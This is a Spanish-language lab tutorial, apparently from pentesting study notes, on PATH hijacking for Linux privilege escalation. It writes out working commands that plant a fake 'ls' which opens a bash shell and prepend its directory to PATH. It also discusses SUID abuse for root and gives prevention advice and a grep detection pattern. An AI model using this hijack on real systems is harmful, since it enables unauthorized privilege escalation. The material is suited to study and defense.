
---
# Laboratorio: PATH Hijacking para escalada de privilegios

**Nota:** para un ejemplo en una máquina de *Hack The Box* ver [Previse](../../../Machines/HTB/CommandInjection/Previse.md)

---

## ¿Qué es el PATH Hijacking?

> El PATH Hijacking es una técnica que consiste en manipular la variable de entorno `PATH` con el objetivo de secuestrar la ejecución de comandos en sistemas Unix/Linux. La variable `PATH` define el conjunto de directorios donde el sistema busca los binarios ejecutables cuando se invoca un comando sin especificar su ruta absoluta.

---

## Riesgo del PATH Hijacking

Cuando un binario (especialmente con privilegios SUID o ejecutado por el sistema) llama a otro comando utilizando una **ruta relativa** (por ejemplo, simplemente `ls` en vez de `/bin/ls`), el sistema buscará ese binario en los directorios definidos por `PATH`.

Si como atacantes tenemos la posibilidad de modificar esa variable `PATH` y colocar antes una ruta controlada por nosotros (por ejemplo, un directorio temporal donde colocamos un binario malicioso llamado `ls`), entonces el sistema ejecutará **nuestro binario falso** en lugar del original.

Esto nos permite ejecutar código arbitrario con los privilegios del binario que nos llama, lo que puede resultar en una escalada de privilegios.

---

## Ejemplo práctico: Simulando PATH Hijacking

### Acción:

Creamos un entorno controlado donde un script vulnerable llama a un comando con ruta relativa. Por ejemplo:

```bash
#!/bin/bash
echo "Ejecutando listado:"
ls
````

Guardamos esto como `script_vulnerable.sh`.

### Simulamos una situación donde `PATH` contiene primero un directorio que controlamos:

```bash
mkdir /tmp/malicioso
echo -e '#!/bin/bash\necho "Comando secuestrado"\n/bin/bash' > /tmp/malicioso/ls
chmod +x /tmp/malicioso/ls
```

Ahora modificamos la variable `PATH` para que primero busque en `/tmp/malicioso`:

```bash
export PATH=/tmp/malicioso:$PATH
```

Y ejecutamos el script:

```bash
./script_vulnerable.sh
```

### Resultado:

```bash
Ejecutando listado:
Comando secuestrado
bash-5.1$
```

---

### Explicación:

- El script vulnerable invoca `ls` sin especificar la ruta absoluta.
    
- Como el sistema busca primero en `/tmp/malicioso`, ejecuta nuestro binario falso `ls`.
    
- En este ejemplo, nuestro `ls` falso simplemente abre una shell.
    

---

## Escenario realista: Binario con SUID que ejecuta comandos sin rutas absolutas

Si un binario con el bit SUID activado ejecuta comandos sin rutas absolutas, y conseguimos controlar su entorno (por ejemplo, ejecutándolo desde un script `cron`, o mediante un exploit que nos permita alterar `PATH`), entonces podemos conseguir que ejecute un binario malicioso nuestro con privilegios de `root`.

Esto representa una amenaza crítica para la seguridad del sistema.

---

## Prevención y buenas prácticas

- **Utilizar rutas absolutas** en todos los comandos dentro de scripts o binarios ejecutados con privilegios elevados.
    
- **Limitar y auditar** las rutas que aparecen en la variable `PATH`, especialmente para usuarios privilegiados.
    
- **Evitar ejecutar scripts como root** que puedan ser manipulados o que no tengan rutas seguras.
    
- **Auditar binarios SUID** que usen rutas relativas mediante técnicas como el análisis estático o dinámico.
    

---

## Comandos útiles para detección

- Ver el contenido de `PATH`:
    

```bash
echo $PATH
```

- Buscar scripts que contengan llamadas a comandos sin rutas absolutas:
    

```bash
grep -rE '^[^#]*\s+(ls|cp|mv|rm|cat|bash|sh)\s' /ruta/a/scripts/
```

- Analizar binarios SUID en busca de uso de comandos relativos (requiere herramientas de análisis binario como `strace`, `ltrace`, o depuración con `gdb`).
    

---

# Resumen

El PATH Hijacking es una técnica peligrosa que se aprovecha del uso descuidado de rutas relativas en entornos privilegiados. Si conseguimos manipular el entorno de ejecución y colocar binarios maliciosos antes en el `PATH`, podemos secuestrar la ejecución de comandos legítimos y obtener acceso elevado al sistema. Esta técnica, combinada con scripts inseguros o binarios SUID mal implementados, puede ser decisiva en una cadena de escalada de privilegios.

---
